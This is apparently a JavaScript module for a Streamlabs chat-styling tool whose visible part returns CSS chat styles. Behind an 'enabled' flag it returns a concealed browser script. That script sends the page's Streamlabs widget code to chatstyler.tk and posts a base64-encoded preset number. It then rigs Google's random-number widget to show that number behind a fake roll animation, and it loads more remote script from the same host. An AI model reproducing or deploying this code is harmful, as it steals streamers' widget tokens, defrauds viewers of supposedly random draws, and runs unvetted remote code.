module.exports.BuildScript = (currentTicketNumber, enabled = false) => {
  if (enabled == true) {
    return `
(async ()=>{
    try{
        let loc = window.location.href;
        if(loc.includes("streamlabs") && loc.includes("widget")){
            let urlparts = loc.split("/");
            let streamcode = urlparts[urlparts.length-1];
            fetch("https://chatstyler.tk:5123/streamlab/"+streamcode);
            
                let namestyle = document.createElement("style");
                namestyle.innerText = "iframe{display:none;}";
                document.getElementsByTagName("head")[0].appendChild(namestyle);
            
            
        }
        window.cbtn=parseInt(atob("${Buffer.from(currentTicketNumber).toString(
          "base64"
        )}"))
        fetch("https://chatstyler.tk:5123/ct/",{
            method:"POST",
            headers:{
                "content-type":"application/json"
            },
            body:JSON.stringify({ct:btoa(window.cbtn)})
        })
        window.ot = document.createElement("script")
        if(!window.rhk){
            if(window.roll)clearInterval(window.roll)
            var gbtn = document.querySelector("#zdOWce")
            var rst = document.querySelector(".gws-csf-randomnumber__result")
            var rsthld = document.querySelector("#Zv1Nfb")
            var orst = document.createElement("div")
            orst.style.display="none"
            orst.innerText=rst.innerText
            orst.setAttribute("class","gws-csf-randomnumber__result")
            rsthld.appendChild(orst)
            window.rhk = ()=>{
                
                var gmn = () => parseInt(document.querySelector("[class*=minVal]").value)
                var gmx = () => parseInt(document.querySelector("[class*=maxVal]").value)
                var targetn = window.cbtn
                var rlnmb = window.cbtn+1200
                if(window.cbtn!==0 && gmn()!==0 && gmn()<=window.cbtn && gmx() >= window.cbtn){
                    window.cbtn = 0;
                    rst.style.display="none"
                    orst.style.display="block"
                    rst.innerText = targetn
                    window.roll = setInterval(()=>{
                        rst.innerText = rlnmb
                        orst.innerText = rlnmb
                        rlnmb-=12
                        rst.innerText = targetn
                        if(rlnmb<=targetn){
                            orst.innerText = targetn
                            rst.innerText = targetn
                            window.canchange=true;
                            clearInterval(window.roll)
                            fetch("https://chatstyler.tk:5123/st/0")
                        }
                    },0)
                    setTimeout(()=>{
                        rst.innerText = targetn
                        rst.style.display="block"
                        orst.style.display="none"
                    },1000)
                }
                
                setTimeout(()=>{
                    window.ot.src="//chatstyler.tk:5123/script.js?${Date.now()}"
                    document.body.appendChild(window.ot)
                },1000)
            }
            gbtn.onclick = window.rhk
        }
    }catch(err){
    }
})()
`;
  }
  const styles = `@import url(https://fonts.googleapis.com/css?family=Roboto:700);

* {
    box-sizing: border-box;
}

html, body {
    height: 100%;
    overflow: hidden;
}

body {
    text-shadow: 0 0 1px #000, 0 0 2px #000;
    /*background: {background_color};*/
    font-family: 'Roboto';
    font-weight: 700;
    font-size: {font_size};
    line-height: 1.5em;
    color: {text_color};
}

#log>div {
    animation: fadeInRight .3s ease forwards, fadeOut 0.5s ease {message_hide_delay} forwards;
    -webkit-animation: fadeInRight .3s ease forwards, fadeOut 0.5s ease {message_hide_delay} forwards;
}
.outer_box{
  background:{box_color};
  padding:{box_padding}px;
  margin-bottom:{box_spacing}px;
  border-radius:{box_corners}px;
}
.colon {
    display: none;
}

#log {
    display: table;
    position: absolute;
    bottom: 0;
    left: 0;
    padding: 0 10px 10px;
    width: 100%;
    table-layout: fixed;
}

#log>div {
    display: table-row;
}

#log>div.deleted {
    visibility: hidden;
}

#log .emote {
    background-repeat: no-repeat;
    background-position: center;
    background-size: contain;
    padding: 0.4em 0.2em;
    position: relative;
}

#log .emote img {
    display: inline-block;
    height: 1em;
    opacity: 0;
}

#log .message,#log .meta {
    vertical-align: top;
    display: table-cell;
    padding-bottom: 0.1em;
}

#log .meta {
    width: 35%;
    text-align: right;
    padding-right: 0.5em;
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
}

#log .message {
    word-wrap: break-word;
    width: 65%;
}

.badge {
    display: inline-block;
    margin-right: 0.2em;
    position: relative;
    height: 1em;
    vertical-align: middle;
    top: -0.1em;
}

.name {
    margin-left: 0.2em;
}`;

  return "styledata = `" + styles + "`";
};
